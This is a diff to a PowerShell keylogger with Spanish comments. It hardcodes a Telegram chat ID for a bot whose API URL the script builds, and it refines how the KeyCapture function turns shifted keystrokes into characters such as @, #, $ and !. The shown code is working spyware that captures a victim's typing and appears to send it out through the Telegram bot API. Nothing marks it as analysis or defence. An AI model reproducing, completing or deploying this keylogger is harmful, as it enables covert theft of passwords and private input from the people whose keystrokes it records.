@@ -1,7 +1,7 @@
 $Token = "$tg"
 $PassPhrase = "$env:COMPUTERNAME"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
-$chatID = ""
+$chatID = "6686157223"
 
 # Espera hasta obtener el chat ID
 while ($chatID.length -eq 0) {
@@ -55,13 +55,12 @@ Function KeyCapture {
 
                             # Si Shift está presionado, el código de la tecla puede generar caracteres especiales
                             if ($shiftPressed) {
-                                # Aquí es donde manejamos las teclas modificadas como @, *, etc.
-                                if ($asc -eq 2) { $LString = "@" }
-                                elseif ($asc -eq 8) { $LString = "[BKSP]" }
-                                elseif ($asc -eq 13) { $LString = "`n" }
+                                # Aquí se ajustan los caracteres especiales cuando Shift está presionado
+                                if ($asc -eq 50) { $LString = "@" }
                                 elseif ($asc -eq 56) { $LString = "*" }
-                                elseif ($asc -eq 51) { $LString = "#" }
                                 elseif ($asc -eq 49) { $LString = "!" }
+                                elseif ($asc -eq 51) { $LString = "#" }
+                                elseif ($asc -eq 52) { $LString = "$" }
                                 # Otros caracteres especiales
                             }
 
